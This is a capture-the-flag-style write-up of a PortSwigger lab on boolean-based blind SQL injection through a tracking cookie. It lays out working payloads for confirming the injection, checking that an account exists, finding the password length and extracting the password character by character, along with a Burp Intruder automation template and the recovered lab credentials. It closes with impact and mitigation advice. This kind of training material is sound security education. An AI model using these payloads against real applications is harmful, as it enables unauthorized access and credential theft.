# Blind SQL injection with conditional responses

**Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)  
**Category:** SQL Injection  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, log in as the `administrator` user.

## Vulnerability
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

## Exploitation

### Steps

1. Intercepted the HTTP request while attempting to log in as `administrator:test`. Identified the `TrackingId` cookie parameter and sent it to Repeater.

2. Verified the vulnerability by comparing application responses for true and false SQL conditions.

    ```sql
    ' AND '1'='1'--;
    ```

    True condition. Result: application displayed **"Welcome back"**.

    ```sql
    ' AND '1'='2'--;
    ```

    False condition. Result: **"Welcome back"** message was not displayed.

    This confirmed a boolean-based blind SQL injection vulnerability.

3. Tested whether the administrator account existed in the database:

    ```sql
    ' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--;
    ```

    The response containing **"Welcome back"** confirmed that the `administrator` user exists.

4. Determined the password length by changing numerical values and checking when the condition returned true.

    ```sql
    TrackingId=azUdMSAO4XNhBcin' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20--;
    ```

    This confirmed that the administrator password contains 20 characters.

5. Extracted the administrator password by testing individual characters using the `SUBSTRING()` function.

    Example:

    ```sql
    ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='0'--;
    ```

    If the response contained **"Welcome back"**, the tested character was correct. The first character was confirmed as `0`.

6. Configured Burp Intruder to automate password extraction.
    - Used the **Cluster Bomb** attack type.
    - Created two payload positions:
        - First position: password character index, using numbers from 1 to 20.
        - Second position: list of possible characters containing lowercase letters and numbers from 0 to 9.

    Example:
    ```http
    TrackingId=azUdMSAO4XNhBcin' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--;
    ```

    The correct values were identified by differences in response length caused by displaying the **"Welcome back"** message.

    Due to the long execution time, the attack was divided into smaller ranges by changing the first payload to smaller groups, for example:
    - 1-3
    - 4-6
    - 7-9

7. Reconstructed the password by matching the first payload position with the correct character from the second payload.

    Final result: `administrator:0fcd7s12fv63bwp9x16m`

8. Successfully logged in as the administrator user.

### Payload

**Boolean condition test (vulnerability confirmation):**
```sql
' AND '1'='1'--
```

```sql
' AND '1'='2'--
```

**Administrator user existence check:**

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

**Password length detection:**

```sql
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20--
```

**Password character extraction:**

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='0'--
```

**Burp Intruder payload template:**

```http
TrackingId=azUdMSAO4XNhBcin' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--;
```

**Extracted credentials:**

```text
administrator:0fcd7s12fv63bwp9x16m
```

### Shortcut
1. Send the `TrackingId` cookie to Burp Intruder.
2. Use a **Cluster Bomb** attack to brute-force the administrator password:
   - First payload position: password character index (`1-20`).
   - Second payload position: possible characters (`a-z`, `0-9`).
3. Use the following payload template:
```http
TrackingId=<value>' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'--
```
4. Identify correct characters by responses containing the **"Welcome back"** message.
5. Reconstruct the password and log in as `administrator`.


## Impact
Blind SQL injection can allow attackers to extract sensitive information from a database without directly viewing query results. By using conditional queries and observing application responses, an attacker can retrieve credentials and gain unauthorized access to user accounts.

## Mitigation
Use prepared statements (parameterized queries) instead of directly inserting user input into SQL queries. Avoid storing passwords in plaintext and use secure password hashing algorithms. Application responses should also avoid revealing differences that allow attackers to confirm SQL query results.


## Tools
- Burp Suite
- Repeater
- Intruder

## Notes
This lab demonstrated how blind SQL injection can be exploited by using application behavior as a response indicator instead of directly retrieving database results.
Initially, running the attack against the entire password range took a very long time. Dividing the attack into smaller groups of character positions (for example 1-3, 4-6, 7-9) made the process faster and easier to analyze.